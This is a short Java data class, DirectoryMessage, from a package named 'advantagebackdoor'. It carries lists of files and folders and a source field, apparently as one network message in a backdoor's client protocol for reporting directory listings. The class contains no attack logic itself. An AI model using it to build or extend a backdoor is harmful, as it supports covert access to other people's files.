package me.faintcloudy.advantagebackdoor.api.message.play.client;

import com.alibaba.fastjson.annotation.JSONField;

import java.util.List;

public class DirectoryMessage extends ClientNetworkMessage {
    @JSONField
    public List<String> files;
    @JSONField
    public List<String> folders;
    @JSONField
    public String from;

    public DirectoryMessage(List<String> files, List<String> folders, String from)
    {
        this.files = files;
        this.folders = folders;
        this.from = from;
    }

    public DirectoryMessage() {}
}
